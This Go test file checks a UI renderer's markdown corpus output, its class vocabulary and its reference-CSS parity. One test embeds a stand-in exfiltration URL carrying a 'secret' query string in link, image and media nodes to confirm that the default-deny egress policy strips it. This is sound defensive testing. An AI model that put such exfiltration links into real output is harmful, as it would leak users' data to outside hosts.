package conformance

import (
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/fuaran-ui/fuaran-go/renderer"
	"github.com/fuaran-ui/fuaran-go/wire"
)

// The renderer certification legs: the deterministic markdown renderer is
// pinned byte-for-byte by the shared markdown corpus; the emitted fuaran-*
// class vocabulary is parity-locked to the reference renderer source; and the
// shipped reference CSS must be a byte-copy of the canonical artefact. The
// reference-source legs skip when the canonical sibling is not checked out
// alongside, mirroring the corpus skip.

type markdownFixture struct {
	ID          string `json:"id"`
	Description string `json:"description"`
	Source      string `json:"source"`
	HTML        string `json:"html"`
	// Policy names the destination policy the render is performed under
	// (WIRE_FORMAT.md §14.1). Absent means permissive — the pure source → html
	// function this corpus has always pinned.
	Policy string `json:"policy"`
}

type markdownCorpus struct {
	Version  int               `json:"version"`
	Fixtures []markdownFixture `json:"fixtures"`
}

// egressPolicyFor maps a fixture's policy name to the policy the HOST
// CONSTRUCTS. §14.1 is explicit that a policy is never carried on the wire — a
// policy an emission can supply is one a hostile emission can widen — so the
// corpus names a policy and each host builds it.
//
// An unrecognised name is a hard failure, never a fallback to permissive: a
// silent fallback turns a fixture this host cannot evaluate into one it appears
// to pass, which is the exact shape of a gate that certifies nothing.
func egressPolicyFor(t *testing.T, name string) renderer.EgressPolicy {
	t.Helper()
	switch name {
	case "", "permissive":
		return renderer.PermissiveEgress()
	case "denyNonLocal":
		return renderer.DenyNonLocalEgress()
	case "declaredExample":
		return renderer.DenyNonLocalEgress().
			AllowOrigin(renderer.ExactHost("cdn.example"), renderer.EgressMedia).
			AllowOrigin(renderer.HostSuffix("docs.example"), renderer.EgressHyperlink)
	default:
		t.Fatalf("markdown fixture names destination policy %q, which this host does not construct — "+
			"add it here rather than letting the fixture render under a policy it did not ask for", name)
		return renderer.EgressPolicy{}
	}
}

// TestMarkdownCorpus pins the GFM renderer to the shared corpus: a one-byte
// divergence from the reference render turns this leg red. A fixture carrying a
// `policy` is rendered under that policy (§14.1); one without is the pure
// permissive case.
func TestMarkdownCorpus(t *testing.T) {
	corpus, _ := loadCorpus(t)
	raw, err := os.ReadFile(filepath.Join(corpus, "markdown", "corpus.json"))
	if err != nil {
		t.Skipf("markdown corpus not found: %v", err)
	}
	var m markdownCorpus
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatalf("parsing markdown corpus: %v", err)
	}
	if len(m.Fixtures) == 0 {
		t.Fatal("markdown corpus declares no fixtures")
	}
	nonPermissive := 0
	for _, fx := range m.Fixtures {
		if fx.Policy != "" && fx.Policy != "permissive" {
			nonPermissive++
		}
		t.Run(fx.ID, func(t *testing.T) {
			policy := egressPolicyFor(t, fx.Policy)
			got := renderer.MarkdownToHTMLWithEgress(policy, fx.Source)
			if got != fx.HTML {
				t.Errorf("render diverged: %s", firstDiff(got, fx.HTML))
			}
			// The pure function IS the permissive case, and this is what pins
			// it: wherever the fixture's policy is permissive, MarkdownToHTML
			// must reproduce the same bytes.
			if policyIsPermissive(fx.Policy) {
				if pure := renderer.MarkdownToHTML(fx.Source); pure != got {
					t.Errorf("MarkdownToHTML is not the permissive case of MarkdownToHTMLWithEgress: %s",
						firstDiff(pure, got))
				}
			}
		})
	}
	// Without a non-permissive fixture the whole leg runs on the permissive
	// path, and a host that never implemented §14.1 would be green here.
	if nonPermissive == 0 {
		t.Fatalf("the markdown corpus carries no non-permissive fixture (%d total) — "+
			"the destination-policy leg is vacuous and cannot fail", len(m.Fixtures))
	}
	t.Logf("markdown corpus EXECUTED: %d fixtures, %d of them under a non-permissive destination policy",
		len(m.Fixtures), nonPermissive)
}

func policyIsPermissive(name string) bool { return name == "" || name == "permissive" }

// markdownNode builds a decoded Markdown node carrying this source. It goes out
// through the canonical encoder and back through the decoder on purpose: the
// ambient leg's whole claim is about what happens to a DECODED tree, so a
// hand-built struct that never met the codec would be testing a different
// posture from the one being asserted.
func markdownNode(t *testing.T, source string) wire.Node {
	t.Helper()
	built := wire.Node{
		ID:   "md",
		Kind: wire.Obj{Tag: "Markdown", Fields: map[string]wire.Value{"text": wire.Str(source)}},
	}
	canonical, err := wire.EncodeNode(built)
	if err != nil {
		t.Fatalf("encoding the markdown node: %v", err)
	}
	node, err := wire.DecodeNode(canonical)
	if err != nil {
		t.Fatalf("decoding the markdown node: %v", err)
	}
	return node
}

// TestMarkdownCorpusAmbient is the AMBIENT leg of the same corpus, and it asks a
// different question from TestMarkdownCorpus above.
//
// That leg calls MarkdownToHTMLWithEgress directly, which certifies the SEAM: a
// policy, handed in, is honoured. It cannot certify that this host's node
// rendering REACHES the seam — a renderer whose Markdown arm still called the
// pure permissive function would pass it in full. So this leg renders each
// fixture as a Markdown NODE through the ordinary entry points and asserts the
// fixture's html appears byte-exact inside the markdown wrapper.
//
// The denyNonLocal fixtures are rendered through RenderHTML with NO POLICY
// NAMED AT ALL. That is the acceptance criterion in executable form: the
// default-deny is ambient, not opt-in. A fixture whose policy is something else
// names it through RenderHTMLWithEgress, because that policy is not the
// default and reaching it deliberately is exactly the intended shape.
func TestMarkdownCorpusAmbient(t *testing.T) {
	corpus, _ := loadCorpus(t)
	raw, err := os.ReadFile(filepath.Join(corpus, "markdown", "corpus.json"))
	if err != nil {
		t.Skipf("markdown corpus not found: %v", err)
	}
	var m markdownCorpus
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatalf("parsing markdown corpus: %v", err)
	}
	ambientDefault := 0
	for _, fx := range m.Fixtures {
		t.Run(fx.ID, func(t *testing.T) {
			node := markdownNode(t, fx.Source)
			var html string
			if fx.Policy == "denyNonLocal" {
				// No policy named — the ambient default IS denyNonLocal.
				html = renderer.RenderHTML(node, nil)
			} else {
				html = renderer.RenderHTMLWithEgress(node, nil, egressPolicyFor(t, fx.Policy))
			}
			want := `<div class="fuaran-markdown">` + fx.HTML + `</div>`
			if !strings.Contains(html, want) {
				t.Errorf("the node render did not reach the policy-taking markdown seam: %s",
					firstDiff(html, want))
			}
		})
		if fx.Policy == "denyNonLocal" {
			ambientDefault++
		}
	}
	// A corpus with no denyNonLocal fixture would run this whole leg through
	// the named entry point, proving nothing about the ambient default — the
	// one property the leg exists for.
	if ambientDefault == 0 {
		t.Fatalf("no denyNonLocal fixture in the markdown corpus (%d total) — "+
			"the ambient-default leg is vacuous and cannot fail", len(m.Fixtures))
	}
	t.Logf("markdown corpus AMBIENT leg EXECUTED: %d fixtures, %d of them through the DEFAULT entry point with no policy named",
		len(m.Fixtures), ambientDefault)
}

// TestAmbientEgressAtTheNodeCallSites is the non-markdown half of the same
// claim: a Link href and an Image src reach the policy through the DEFAULT
// entry point, with the refusal recorded in the document and the query string —
// where an exfiltrated payload sits — absent from every emitted byte.
func TestAmbientEgressAtTheNodeCallSites(t *testing.T) {
	const exfil = "https://collector.example/x?s=secret"
	cases := []struct {
		name, json, marker string
	}{
		{
			"link",
			`{"id":"l","kind":{"$type":"Link","download":false,"href":{"$type":"Static","value":"` + exfil + `"},"label":"The report"}}`,
			`data-fuaran-egress-refused="hyperlink:collector.example"`,
		},
		{
			"image",
			`{"id":"i","kind":{"$type":"Image","alt":"chart","src":{"$type":"Static","value":"` + exfil + `"},"variant":"Default"}}`,
			`data-fuaran-egress-refused="media:collector.example"`,
		},
		// Phase 1076 — a Media `src` is the same class and the same COLLAPSE:
		// the element must have a source. Its poster and an Image's srcSet
		// candidates take the same class but are DROPPED rather than
		// collapsed, so they are pinned separately in the renderer package.
		{
			"media",
			`{"id":"m","kind":{"$type":"Media","kind":{"$type":"Video"},"label":"Report","src":{"$type":"Static","value":"` + exfil + `"}}}`,
			`data-fuaran-egress-refused="media:collector.example"`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			node, err := wire.DecodeNode(c.json)
			if err != nil {
				t.Fatalf("decode: %v", err)
			}
			// No policy named anywhere — this is the acceptance criterion.
			html := renderer.RenderHTML(node, nil)
			if !strings.Contains(html, renderer.EgressRefusalURL) {
				t.Errorf("the destination was not refused under the ambient default:\n%s", html)
			}
			if !strings.Contains(html, c.marker) {
				t.Errorf("html is missing the refusal marker %q:\n%s", c.marker, html)
			}
			for _, leak := range []string{"?s=secret", "s=secret", "collector.example/x"} {
				if strings.Contains(html, leak) {
					t.Errorf("the refused URL's %q survived into the document:\n%s", leak, html)
				}
			}
			// And the named opt-out still renders the real destination — the
			// refusal is a policy answer, not a hard-coded neuter.
			widened := renderer.RenderHTMLWithEgress(node, nil, renderer.PermissiveEgress())
			if !strings.Contains(widened, exfil) {
				t.Errorf("the named permissive entry point did not emit the destination:\n%s", widened)
			}
		})
	}
}

// referenceHostNames are the spellings the F# reference host has shipped under.
// The sibling was renamed once (fuaran → fuaran-dotnet) and the oracles' paths
// were not updated, so every one of them Skipf'd for as long as the rename was
// old: a gate that reports success while checking nothing. Accepting both
// spellings means a rename in either direction cannot silently disable them
// again, and `referenceHostRoot` turns a genuine miss into a failure rather than
// a skip whenever the checkout is plainly cross-host.
var referenceHostNames = []string{"fuaran-dotnet", "fuaran"}

// otherHostNames are the sibling hosts whose presence proves this is a
// cross-host checkout (the shape the conformance gate builds) rather than a
// standalone clone. Deliberately excludes this host and the reference host.
var otherHostNames = []string{"fuaran-ts", "fuaran-py", "fuaran-rs", "fuaran-kt", "fuaran-swift"}

// referenceHostRoot locates the F# reference host beside the corpus.
//
// The skip below is correct for someone who genuinely cloned this repo (plus the
// corpus) alone — that is why it exists, and why nobody noticed it firing
// everywhere else. What is NOT correct is skipping in a cross-host checkout,
// where a missing reference host means the oracle has been silently disabled.
// So the two cases are separated: any other host present ⇒ hard failure naming
// what was tried; nothing else present ⇒ the honest standalone skip.
func referenceHostRoot(t *testing.T, corpus string) string {
	t.Helper()
	estate := filepath.Dir(corpus)
	for _, name := range referenceHostNames {
		if _, err := os.Stat(filepath.Join(estate, name, "src")); err == nil {
			return filepath.Join(estate, name)
		}
	}
	for _, sibling := range otherHostNames {
		if _, err := os.Stat(filepath.Join(estate, sibling)); err == nil {
			t.Fatalf("cross-host checkout detected (%s/ is present under %s) but the F# reference host is at none of %v — "+
				"the render-parity oracles cannot run. This is the failure mode this check exists for: if the sibling was "+
				"renamed again, add the new spelling to referenceHostNames rather than letting the oracle skip.",
				sibling, estate, referenceHostNames)
		}
	}
	t.Skipf("F# reference host not found under %s (tried %v) and no sibling host is present either; skipping — genuine standalone checkout", estate, referenceHostNames)
	return ""
}

// referenceRendererFiles are the canonical renderer sources the class
// vocabulary is extracted from (the parity oracle).
func referenceRendererFiles(t *testing.T, corpus string) []string {
	root := referenceHostRoot(t, corpus)
	return []string{
		filepath.Join(root, "src", "Fuaran.UI.Renderer.Server", "Render.fs"),
		filepath.Join(root, "src", "Fuaran.UI.Renderer", "Render.fs"),
		filepath.Join(root, "src", "Fuaran.UI.Renderer.Core", "Theme.fs"),
		// The canonical inline-SVG builder — the source of the fuaran-drawing*
		// class vocabulary (both F# renderers call into it).
		filepath.Join(root, "src", "Fuaran.UI.Renderer.Core", "DrawingSvg.fs"),
		// The shared class-composition module: the reference host builds its
		// tone/variant classes here (fuaran-metric- + tone, fuaran-badge- +
		// tone, the layout and toast families), and BOTH renderers call into
		// it rather than spelling those literals out. Omitting it makes the
		// oracle report 31 correct classes as absent — the vocabulary is
		// genuinely in the reference, just not in the two Render.fs files.
		filepath.Join(root, "src", "Fuaran.UI.Renderer.Core", "Css.fs"),
	}
}

var classTokenRe = regexp.MustCompile(`fuaran-[a-zA-Z0-9-]*`)

// classPrefixNamespace is the bare class namespace — admissible as an exact
// class nowhere, and as a composition prefix nowhere (see referenceVocabulary).
const classPrefixNamespace = "fuaran-"

// referenceVocabulary returns (exact, prefixes): a token ending in '-' is a
// composition prefix (fuaran-metric- styles fuaran-metric-brand); the rest
// are exact class literals.
func referenceVocabulary(t *testing.T, corpus string) (map[string]bool, []string) {
	t.Helper()
	exact := make(map[string]bool)
	var prefixes []string
	for _, path := range referenceRendererFiles(t, corpus) {
		raw, err := os.ReadFile(path)
		if err != nil {
			// NOT a skip: referenceHostRoot already established the reference
			// host is here, so a missing FILE is a moved/renamed source, which
			// would silently empty the vocabulary. Fail naming it.
			t.Fatalf("reference renderer source missing inside the located reference host: %v", err)
		}
		for _, token := range classTokenRe.FindAllString(string(raw), -1) {
			if strings.HasSuffix(token, "-") {
				// The bare namespace is NOT a vocabulary entry. It occurs in the
				// reference sources as a fragment of string concatenation, and
				// admitting it as a prefix makes this oracle vacuous: every class
				// emittedClasses collects starts with "fuaran-", so a single
				// "fuaran-" prefix matches all of them and the parity lock passes
				// unconditionally. It did — an invented "fuaran-zzheading" sailed
				// through until the perturbation probe caught it. A prefix must
				// name at least one segment beyond the namespace.
				if token == classPrefixNamespace {
					continue
				}
				prefixes = append(prefixes, token)
			} else {
				exact[token] = true
			}
		}
	}
	return exact, prefixes
}

var classAttrRe = regexp.MustCompile(`class="([^"]*)"`)

func emittedClasses(html string) map[string]bool {
	out := make(map[string]bool)
	for _, m := range classAttrRe.FindAllStringSubmatch(html, -1) {
		for _, tok := range strings.Fields(m[1]) {
			if strings.HasPrefix(tok, "fuaran-") {
				out[tok] = true
			}
		}
	}
	return out
}

// TestClassVocabularyParity renders every node round-trip fixture and asserts
// every emitted fuaran-* class is in the reference renderer's vocabulary —
// the cross-host parity lock, the rendering analogue of the wire corpus.
func TestClassVocabularyParity(t *testing.T) {
	corpus, m := loadCorpus(t)
	exact, prefixes := referenceVocabulary(t, corpus)
	// Guard against an extraction regression silently emptying the oracle.
	if len(exact) <= 50 || !exact["fuaran-node"] {
		t.Fatalf("reference vocabulary extraction looks broken: %d exact classes", len(exact))
	}

	inVocab := func(cls string) bool {
		if exact[cls] {
			return true
		}
		for _, p := range prefixes {
			if strings.HasPrefix(cls, p) {
				return true
			}
		}
		return false
	}

	ran, checked := 0, 0
	for _, fx := range m.Fixtures {
		if fx.Kind != "node-round-trip" {
			continue
		}
		ran++
		t.Run(fx.ID, func(t *testing.T) {
			node, err := wire.DecodeNode(readFixture(t, corpus, fx.InputFile))
			if err != nil {
				t.Fatalf("decode: %v", err)
			}
			html := renderer.RenderHTML(node, nil)
			for cls := range emittedClasses(html) {
				checked++
				if !inVocab(cls) {
					t.Errorf("emitted class %q is not in the reference renderer vocabulary", cls)
				}
			}
		})
	}
	// A pass proves nothing unless the oracle actually looked at something —
	// which is precisely the defect this test was in for as long as its
	// reference path was stale.
	if ran == 0 || checked == 0 {
		t.Fatalf("class-vocabulary oracle checked nothing (%d fixtures, %d class occurrences) — it is not exercising the renderer", ran, checked)
	}
	t.Logf("class-vocabulary parity EXECUTED: %d fixtures, %d emitted-class occurrences, %d reference classes", ran, checked, len(exact))
}

// TestReferenceCSSByteParity asserts the shipped reference stylesheet is a
// byte-copy of the canonical artefact (skips only on a genuine standalone
// checkout — see referenceHostRoot).
func TestReferenceCSSByteParity(t *testing.T) {
	corpus, _ := loadCorpus(t)
	canonical := filepath.Join(referenceHostRoot(t, corpus),
		"src", "Fuaran.UI.Renderer", "content", "fuaran-reference.css")
	raw, err := os.ReadFile(canonical)
	if err != nil {
		// NOT a skip — the reference host was located, so a missing stylesheet
		// is a moved artefact, not a standalone clone.
		t.Fatalf("canonical stylesheet missing inside the located reference host: %v", err)
	}
	if renderer.ReferenceCSS() != string(raw) {
		t.Error("renderer/content/fuaran-reference.css has drifted from the canonical stylesheet — re-copy it byte-for-byte")
	}
	t.Logf("reference-CSS byte parity EXECUTED against %s (%d bytes)", canonical, len(raw))
}
